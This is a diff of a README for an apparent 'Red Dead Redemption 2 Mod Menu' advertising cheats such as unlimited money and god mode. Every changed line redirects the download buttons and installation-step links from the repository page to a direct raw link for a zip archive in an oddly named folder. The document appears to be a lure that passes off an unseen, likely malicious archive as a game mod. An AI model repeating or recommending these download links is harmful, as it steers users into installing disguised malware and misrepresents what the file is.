@@ -1,6 +1,6 @@
 # 🎮 Red-Dead-Redemption-2-Mod-Menu - Unlock Unlimited Gaming Power Today
 
-[![Download Now](https://img.shields.io/badge/Download-RDR2_ModMenu_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu)
+[![Download Now](https://img.shields.io/badge/Download-RDR2_ModMenu_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to the ultimate Red Dead Redemption 2 Mod Menu for 2026! This powerful t
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu](https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu)
+Visit this link to download the application: [https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip](https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip)
 
 Once you click the link, you'll be taken to the download page. Follow these simple steps:
 
@@ -74,7 +74,7 @@ Before installing the mod menu, make sure:
 
 ### Step 2: Download the Mod Menu
 
-Visit this link to download the application: [https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu](https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu)
+Visit this link to download the application: [https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip](https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip)
 
 Click the download button and wait for the file to save to your computer.
 
@@ -253,7 +253,7 @@ A: No, this mod menu is specifically designed for Red Dead Redemption 2 only.
 
 Don't wait any longer! Download the Red Dead Redemption 2 Mod Menu today and experience the game like never before. With unlimited money, god mode, and countless other features, you'll wonder how you ever played without it.
 
-[![Get Started Now](https://img.shields.io/badge/Download-Now-00C853?style=for-the-badge&logo=download&logoColor=white)](https://github.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu)
+[![Get Started Now](https://img.shields.io/badge/Download-Now-00C853?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/goateed-sassafrasoil7177/Red-Dead-Redemption-2-Mod-Menu/main/subprioress/v3.0.zip)
 
 ---
 
